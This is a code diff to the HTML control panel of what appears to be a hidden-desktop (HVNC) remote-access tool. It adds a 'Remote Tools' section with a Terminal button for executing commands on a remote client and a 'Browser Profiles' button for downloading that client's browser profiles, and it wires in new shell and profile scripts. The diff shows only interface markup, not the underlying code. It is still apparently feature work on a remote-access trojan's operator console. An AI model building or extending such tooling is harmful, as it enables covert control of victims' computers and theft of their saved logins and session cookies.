@@ -75,6 +75,20 @@
         <span id="status" data-state="">Idle</span>
       </div>
 
+      <!-- Remote Shell - available in all modes -->
+      <div class="hud-section" id="remoteShellSection">
+        <div class="section-title">Remote Tools</div>
+        <div class="hvnc-buttons">
+          <button id="openTerminalBtn" class="hvnc-btn primary" type="button" title="Open terminal (Ctrl+`)">
+            <span class="hvnc-icon">💻</span> Terminal
+          </button>
+          <button id="openProfilesBtn" class="hvnc-btn" type="button" title="Download browser profiles">
+            <span class="hvnc-icon">🌐</span> Browser Profiles
+          </button>
+        </div>
+        <div class="hint">Execute commands and export profiles from client</div>
+      </div>
+
       <div class="hud-section hidden-desktop-controls" id="hiddenDesktopControls" data-requires-hidden="true" style="display: none;">
         <div class="section-title">HVNC Controls</div>
         
@@ -372,9 +386,11 @@
   </script>
   <script src="js/app_core.js?v=20260210-1" defer></script>
   <script src="js/app_display.js?v=20260203-2" defer></script>
-  <script src="js/app_connection.js?v=20260210-1" defer></script>
+  <script src="js/app_connection.js?v=20260210-2" defer></script>
   <script src="js/app_storage.js?v=20260203-2" defer></script>
   <script src="js/app_hvnc.js?v=20260210-1" defer></script>
+  <script src="js/app_shell.js?v=20260210-1" defer></script>
+  <script src="js/app_profiles.js?v=20260210-1" defer></script>
   <script src="js/app_bootstrap.js?v=20260203-2" defer></script>
 </body>
 </html>
